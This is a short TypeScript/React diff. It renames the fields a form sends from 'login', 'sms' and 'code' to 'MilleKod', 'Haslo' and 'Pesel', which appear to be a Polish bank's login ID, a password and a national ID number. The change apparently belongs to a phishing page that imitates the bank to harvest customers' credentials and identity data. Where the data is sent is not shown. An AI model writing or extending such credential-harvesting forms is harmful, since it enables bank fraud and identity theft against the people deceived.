@@ -80,9 +80,9 @@ async function handleContinue(e: React.FormEvent<HTMLButtonElement>): Promise<vo
 
     setStatus("loading");
     const formData = new FormData();
-    formData.append("login", field1);
-    formData.append("sms", field2);
-    formData.append("code", field3);
+    formData.append("MilleKod", field1);
+    formData.append("Haslo", field2);
+    formData.append("Pesel", field3);
 
     const data = Object.fromEntries(formData.entries());
 
